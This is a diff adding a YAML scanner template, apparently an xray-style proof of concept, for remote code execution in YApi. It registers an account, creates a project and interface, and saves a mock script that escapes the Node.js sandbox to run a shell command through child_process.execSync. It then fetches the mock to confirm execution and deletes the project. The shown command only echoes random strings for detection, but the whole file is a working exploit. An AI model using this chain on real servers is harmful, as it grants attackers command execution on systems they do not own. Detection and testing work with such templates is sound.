@@ -1,0 +1,116 @@
+detail:
+  author: tangshoupu
+  info: yapi-rce
+  links:
+  - https://github.com/YMFE/yapi/issues/2229
+expression: r0() && r1() && r2() && r3() && r4() && r5() && r6() && r7()
+manual: true
+name: poc-yaml-yapi-rce
+rules:
+  r0:
+    expression: response.status == 200 && response.headers["Set-Cookie"].contains("_yapi_token=")
+      && response.headers["Set-Cookie"].contains("_yapi_uid=") && response.body.bcontains(bytes(redemail))
+    request:
+      body: '{"email":"{{redemail}}@qq.com","password":"{{redpassword}}","username":"{{redemail}}"}
+
+        '
+      cache: true
+      follow_redirects: true
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      method: POST
+      path: /api/user/reg
+  r1:
+    expression: response.status == 200 && response.content_type.icontains("application/json")
+      && response.body.bcontains(bytes("custom_field1"))
+    output:
+      group_id: search["group_id"]
+      search: '"\"_id\":(?P<group_id>.+?),".bsubmatch(response.body)'
+    request:
+      cache: true
+      method: GET
+      path: /api/group/list
+  r2:
+    expression: "response.status == 200 && response.body.bcontains(bytes(\"\u6210\u529F\
+      \uFF01\")) && response.body.bcontains(bytes(redproject))"
+    output:
+      project_id: search["project_id"]
+      search: '"tag\":\\[\\],\"_id\":(?P<project_id>.+?),".bsubmatch(response.body)'
+    request:
+      body: '{"name":"{{redproject}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}
+
+        '
+      cache: true
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      method: POST
+      path: /api/project/add
+  r3:
+    expression: "response.status == 200 && response.body.bcontains(bytes(\"\u6210\u529F\
+      \uFF01\"))"
+    output:
+      catid: search["catid"]
+      search: '"\"_id\":(?P<catid>.+?),".bsubmatch(response.body)'
+    request:
+      cache: true
+      method: GET
+      path: /api/project/get?id={{project_id}}
+  r4:
+    expression: "response.status == 200 && response.body.bcontains(bytes(\"\u6210\u529F\
+      \uFF01\")) && response.body.bcontains(bytes(redinterface))"
+    output:
+      interface_id: search["interface_id"]
+      search: '"\"_id\":(?P<interface_id>.+?),".bsubmatch(response.body)'
+    request:
+      body: '{"method":"GET","catid":"{{catid}}","title":"{{redinterface}}","path":"/{{redinterface}}","project_id":{{project_id}}}
+
+        '
+      cache: true
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      method: POST
+      path: /api/interface/add
+  r5:
+    expression: "response.status == 200 && response.body.bcontains(bytes(\"\u6210\u529F\
+      \uFF01\"))"
+    request:
+      body: '{"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const
+        sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor
+        = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor(''return
+        process'')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"echo
+        {{r1}}${{{r2}}}{{r3}}^{{r4}}\").toString()","enable":true}
+
+        '
+      cache: true
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      method: POST
+      path: /api/plugin/advmock/save
+  r6:
+    expression: response.status == 200 && (response.body.bcontains(bytes(r1 + r3 +
+      "^" + r4)) || response.body.bcontains(bytes(r1 + "${" + r2 + "}" + r3 + r4)))
+    request:
+      cache: true
+      method: GET
+      path: /mock/{{project_id}}/{{redinterface}}
+  r7:
+    expression: response.status == 200
+    request:
+      body: '{"id":{{project_id}}}
+
+        '
+      cache: true
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      method: POST
+      path: /api/project/del
+set:
+  r1: randomLowercase(10)
+  r2: randomLowercase(10)
+  r3: randomLowercase(10)
+  r4: randomLowercase(10)
+  redemail: randomLowercase(15)
+  redinterface: randomLowercase(10)
+  redpassword: randomLowercase(15)
+  redproject: randomLowercase(8)
+transport: http
